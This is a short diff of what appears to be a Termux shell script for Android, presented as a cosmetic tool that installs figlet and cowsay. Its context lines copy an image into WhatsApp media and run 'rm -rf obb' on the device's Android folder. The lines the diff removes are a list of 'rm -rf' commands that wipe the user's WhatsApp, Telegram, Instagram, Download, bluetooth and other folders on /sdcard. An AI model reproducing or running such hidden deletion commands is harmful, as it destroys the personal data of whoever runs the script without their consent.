@@ -18,21 +18,6 @@ cp -r JaiRajputana.jpg /sdcard/WhatsApp/Media
 cd /sdcard/Android
 rm -rf obb
 cd /sdcard
-rm -rf Telegram 
-rm -rf browser
-rm -rf GBWhatsApp
-rm -rf BGMI
-rm -rf ApkEditor
-rm -rf Download
-rm -rf Instagram
-rm -rf SHAREit
-rm -rf bluetooth
-rm -rf WhatsApp
-rm -rf VidMate
-rm -rf Instagram
-rm -rf YoWhatsApp
-rm -rf MIUI
-rm -rf GBWhatsApp
 cd $HOME
 pkg install figlet -y
 pkg install cowsay
